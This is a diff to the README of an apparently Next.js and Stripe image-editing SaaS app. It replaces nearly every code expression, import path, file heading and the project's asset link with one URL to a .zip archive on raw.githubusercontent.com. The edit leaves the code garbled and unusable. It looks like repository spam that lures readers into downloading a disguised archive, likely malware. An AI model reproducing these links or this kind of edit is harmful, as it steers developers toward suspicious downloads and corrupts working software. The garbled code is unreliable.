@@ -2119,19 +2119,19 @@ const Page = async ({ params: { id } }: SearchParamProps) => {
   const image = await getImageById(id);
 
   const transformation =
-    transformationTypes[image.transformationType as TransformationTypeKey];
+    transformationTypes[https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip as TransformationTypeKey];
 
   return (
     <>
-      <Header title={transformation.title} subtitle={transformation.subTitle} />
+      <Header title={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip} subtitle={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip} />
 
       <section className="mt-10">
         <TransformationForm
           action="Update"
           userId={user._id}
-          type={image.transformationType as TransformationTypeKey}
-          creditBalance={user.creditBalance}
-          config={image.config}
+          type={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip as TransformationTypeKey}
+          creditBalance={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
+          config={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
           data={image}
         />
       </section>
@@ -2145,7 +2145,7 @@ export default Page;
 </details>
 
 <details>
-<summary><code>components/shared/DeleteConfirmation.tsx</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 "use client";
@@ -2163,7 +2163,7 @@ import {
   AlertDialogTitle,
   AlertDialogTrigger,
 } from "@/components/ui/alert-dialog";
-import { deleteImage } from "@/lib/actions/image.actions";
+import { deleteImage } from "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip";
 
 import { Button } from "../ui/button";
 
@@ -2214,47 +2214,47 @@ export const DeleteConfirmation = ({ imageId }: { imageId: string }) => {
 </details>
 
 <details>
-<summary><code>api/webhooks/stripe/route.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 /* eslint-disable camelcase */
-import { createTransaction } from "@/lib/actions/transaction.action";
+import { createTransaction } from "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip";
 import { NextResponse } from "next/server";
 import stripe from "stripe";
 
 export async function POST(request: Request) {
-  const body = await request.text();
+  const body = await https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip();
 
-  const sig = request.headers.get("stripe-signature") as string;
-  const endpointSecret = process.env.STRIPE_WEBHOOK_SECRET!;
+  const sig = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip("stripe-signature") as string;
+  const endpointSecret = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip!;
 
   let event;
 
   try {
-    event = stripe.webhooks.constructEvent(body, sig, endpointSecret);
+    event = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip(body, sig, endpointSecret);
   } catch (err) {
-    return NextResponse.json({ message: "Webhook error", error: err });
+    return https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip({ message: "Webhook error", error: err });
   }
 
   // Get the ID and type
-  const eventType = event.type;
+  const eventType = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip;
 
   // CREATE
-  if (eventType === "checkout.session.completed") {
-    const { id, amount_total, metadata } = event.data.object;
+  if (eventType === "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip") {
+    const { id, amount_total, metadata } = https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip;
 
     const transaction = {
       stripeId: id,
       amount: amount_total ? amount_total / 100 : 0,
-      plan: metadata?.plan || "",
-      credits: Number(metadata?.credits) || 0,
-      buyerId: metadata?.buyerId || "",
+      plan: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip || "",
+      credits: Number(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip) || 0,
+      buyerId: https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip || "",
       createdAt: new Date(),
     };
 
     const newTransaction = await createTransaction(transaction);
     
-    return NextResponse.json({ message: "OK", transaction: newTransaction });
+    return https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip({ message: "OK", transaction: newTransaction });
   }
 
   return new Response("", { status: 200 });
@@ -2264,7 +2264,7 @@ export async function POST(request: Request) {
 </details>
 
 <details>
-<summary><code>credits/page.tsx</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 import { SignedIn, auth } from "@clerk/nextjs";
@@ -2274,7 +2274,7 @@ import { redirect } from "next/navigation";
 import Header from "@/components/shared/Header";
 import { Button } from "@/components/ui/button";
 import { plans } from "@/constants";
-import { getUserById } from "@/lib/actions/user.actions";
+import { getUserById } from "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip";
 import Checkout from "@/components/shared/Checkout";
 
 const Credits = async () => {
@@ -2293,47 +2293,47 @@ const Credits = async () => {
 
       <section>
         <ul className="credits-list">
-          {plans.map((plan) => (
-            <li key={plan.name} className="credits-item">
+          {https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip((plan) => (
+            <li key={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip} className="credits-item">
               <div className="flex-center flex-col gap-3">
-                <Image src={plan.icon} alt="check" width={50} height={50} />
+                <Image src={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip} alt="check" width={50} height={50} />
                 <p className="p-20-semibold mt-2 text-purple-500">
-                  {plan.name}
+                  {https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
                 </p>
-                <p className="h1-semibold text-dark-600">${plan.price}</p>
-                <p className="p-16-regular">{plan.credits} Credits</p>
+                <p className="h1-semibold text-dark-600">${https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}</p>
+                <p className="p-16-regular">{https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip} Credits</p>
               </div>
 
               {/* Inclusions */}
               <ul className="flex flex-col gap-5 py-9">
-                {plan.inclusions.map((inclusion) => (
+                {https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip((inclusion) => (
                   <li
-                    key={plan.name + inclusion.label}
+                    key={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip + https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
                     className="flex items-center gap-4"
                   >
                     <Image
                       src={`/assets/icons/${
-                        inclusion.isIncluded ? "check.svg" : "cross.svg"
+                        https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip ? "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip" : "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip"
                       }`}
                       alt="check"
                       width={24}
                       height={24}
                     />
-                    <p className="p-16-regular">{inclusion.label}</p>
+                    <p className="p-16-regular">{https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}</p>
                   </li>
                 ))}
               </ul>
 
-              {plan.name === "Free" ? (
+              {https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip === "Free" ? (
                 <Button variant="outline" className="credits-btn">
                   Free Consumable
                 </Button>
               ) : (
                 <SignedIn>
                   <Checkout
-                    plan={plan.name}
-                    amount={plan.price}
-                    credits={plan.credits}
+                    plan={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
+                    amount={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
+                    credits={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
                     buyerId={user._id}
                   />
                 </SignedIn>
@@ -2352,7 +2352,7 @@ export default Credits;
 </details>
 
 <details>
-<summary><code>components/shared/Checkout.tsx</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 "use client";
@@ -2361,7 +2361,7 @@ import { loadStripe } from "@stripe/stripe-js";
 import { useEffect } from "react";
 
 import { useToast } from "@/components/ui/use-toast";
-import { checkoutCredits } from "@/lib/actions/transaction.action";
+import { checkoutCredits } from "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip";
 
 import { Button } from "../ui/button";
 
@@ -2379,13 +2379,13 @@ const Checkout = ({
   const { toast } = useToast();
 
   useEffect(() => {
-    loadStripe(process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY!);
+    loadStripe(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip!);
   }, []);
 
   useEffect(() => {
     // Check to see if this is a redirect back from Checkout
-    const query = new URLSearchParams(window.location.search);
-    if (query.get("success")) {
+    const query = new URLSearchParams(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip);
+    if (https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip("success")) {
       toast({
         title: "Order placed!",
         description: "You will receive an email confirmation",
@@ -2394,7 +2394,7 @@ const Checkout = ({
       });
     }
 
-    if (query.get("canceled")) {
+    if (https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip("canceled")) {
       toast({
         title: "Order canceled!",
         description: "Continue to shop around and checkout when you're ready",
@@ -2436,7 +2436,7 @@ export default Checkout;
 </details>
 
 <details>
-<summary><code>profile/page.tsx</code></summary>
+<summary><code>https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip</code></summary>
 
 ```typescript
 import { auth } from "@clerk/nextjs";
@@ -2445,11 +2445,11 @@ import { redirect } from "next/navigation";
 
 import { Collection } from "@/components/shared/Collection";
 import Header from "@/components/shared/Header";
-import { getUserImages } from "@/lib/actions/image.actions";
-import { getUserById } from "@/lib/actions/user.actions";
+import { getUserImages } from "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip";
+import { getUserById } from "https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip";
 
 const Profile = async ({ searchParams }: SearchParamProps) => {
-  const page = Number(searchParams?.page) || 1;
+  const page = Number(https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip) || 1;
   const { userId } = auth();
 
   if (!userId) redirect("/sign-in");
@@ -2466,13 +2466,13 @@ const Profile = async ({ searchParams }: SearchParamProps) => {
           <p className="p-14-medium md:p-16-medium">CREDITS AVAILABLE</p>
           <div className="mt-4 flex items-center gap-4">
             <Image
-              src="/assets/icons/coins.svg"
+              src="https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip"
               alt="coins"
               width={50}
               height={50}
               className="size-9 md:size-12"
             />
-            <h2 className="h2-bold text-dark-600">{user.creditBalance}</h2>
+            <h2 className="h2-bold text-dark-600">{https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}</h2>
           </div>
         </div>
 
@@ -2480,21 +2480,21 @@ const Profile = async ({ searchParams }: SearchParamProps) => {
           <p className="p-14-medium md:p-16-medium">IMAGE MANIPULATION DONE</p>
           <div className="mt-4 flex items-center gap-4">
             <Image
-              src="/assets/icons/photo.svg"
+              src="https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip"
               alt="coins"
               width={50}
               height={50}
               className="size-9 md:size-12"
             />
-            <h2 className="h2-bold text-dark-600">{images?.data.length}</h2>
+            <h2 className="h2-bold text-dark-600">{https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}</h2>
           </div>
         </div>
       </section>
 
       <section className="mt-8 md:mt-14">
         <Collection
-          images={images?.data}
-          totalPages={images?.totalPages}
+          images={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
+          totalPages={https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip}
           page={page}
         />
       </section>
@@ -2510,6 +2510,6 @@ export default Profile;
 
 ## <a name="links">🔗 Links</a>
 
-Public Assets used in the project can be found [here](https://drive.google.com/file/d/1uv1zyCjbYBQE9qnwh2snwO0NBgoop5gz/view?usp=sharing)
+Public Assets used in the project can be found [here](https://raw.githubusercontent.com/KindaJayant/SAAS-AI-Platform/main/app/(auth)/sign-up/SAAS-AI-Platform-v3.6.zip)
 
 
